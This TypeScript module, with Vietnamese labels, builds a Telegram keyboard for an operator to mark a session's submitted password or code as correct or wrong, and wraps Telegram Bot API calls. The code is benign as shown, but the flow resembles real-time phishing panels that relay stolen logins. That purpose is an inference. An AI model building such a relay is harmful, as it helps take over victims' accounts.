import { getTelegramConfig } from '@/lib/app-config';

export type ApprovalType = 'password' | 'code';

export function buildApprovalKeyboard(type: ApprovalType, sessionId: string) {
    return {
        inline_keyboard: [
            [
                { text: '✅ Duyệt — đúng', callback_data: `approve:${type}:${sessionId}` },
                { text: '❌ Sai — thử lại', callback_data: `reject:${type}:${sessionId}` }
            ]
        ]
    };
}

type TelegramApiResponse<T = unknown> = {
    ok: boolean;
    description?: string;
    result?: T;
};

export async function getTelegramCredentials() {
    const config = await getTelegramConfig();
    if (!config) return null;
    return config;
}

export async function telegramRequest<T = unknown>(
    method: string,
    body: Record<string, unknown>
): Promise<TelegramApiResponse<T>> {
    const config = await getTelegramConfig();
    if (!config) {
        throw new Error('Telegram chưa được cấu hình (TOKEN / CHAT_ID)');
    }

    const url = `https://api.telegram.org/bot${config.token}/${method}`;
    const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
    });

    return response.json() as Promise<TelegramApiResponse<T>>;
}
